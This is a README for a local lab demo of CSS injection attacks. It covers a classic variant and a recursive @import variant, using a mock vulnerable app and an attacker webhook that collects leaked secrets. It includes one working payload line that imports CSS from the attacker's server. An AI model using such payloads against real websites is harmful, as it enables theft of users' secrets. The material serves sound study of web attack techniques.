# c5517n
CSS Injection.

## Classic
### Overview
An example of a classical CSS Injection attack.
The attacker needs to have the user POST the attack vector every time.


### Usage
1. Run `attacker/server.py` and `user/server.py`.
1. Run `attacker/exploit.py`.
1. Post the attack vector generated by `attacker/exploit.py` to `0.0.0.0:8080`, the leaked secret will be displayed on the console of `attacker/server.py`. 
1. Enter the leaked secret into `attacker/exploit.py` and continue the attack.
1. Loop...

### Files
- `user/server.py`: Mock web application that has CSS Injection vulnerability.
- `attacker/exploit.py`: Generates a CSS Injection attack vector and copies it to the clipboard.
- `attacker/server.py`: Webhook to collect secret.

## Recursive
### Overview
An example of CSS Injection using Recursive Import technique.

### Usage
1. Run `attacker/server.py` and `user/server.py`.
1. Post the attack vector: `<style>@import url('http://0.0.0.0:8081/css/0.css')</style>`.
1. Leakage continues recursively due to CSS import

### Files
- `user/server.py`: Mock web application that has CSS Injection vulnerability.
- `attacker/server.py`: Webhook to collect secret.
- `attacker/templates/tmpl.jinja2`: Attack vector(CSS) template.

### Reference
[m---/onsen](https://github.com/m---/onsen)